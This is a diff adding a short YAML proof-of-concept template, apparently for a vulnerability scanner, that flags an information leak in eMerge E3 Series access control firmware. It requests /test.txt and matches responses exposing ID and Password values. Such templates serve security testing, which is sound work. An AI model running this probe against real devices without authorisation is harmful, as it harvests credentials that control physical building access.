@@ -1,0 +1,15 @@
+id: poc-yaml-emerge-e3-series-info-leak
+info:
+  name: eMerge E3 Series 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: linear_emerge_e3_access_control_firmware
+requests:
+- method: GET
+  path: /test.txt
+  expression: "status_code == 200 && \ncontains(body, \"ID=\") &&\ncontains(body,\
+    \ \"Password=\") &&\nmatches(body, \"ID='(.*)',Password='(.*)'\") &&\n!contains(content_type,\
+    \ \"html\")\n"
+variables: {}
+transport: http
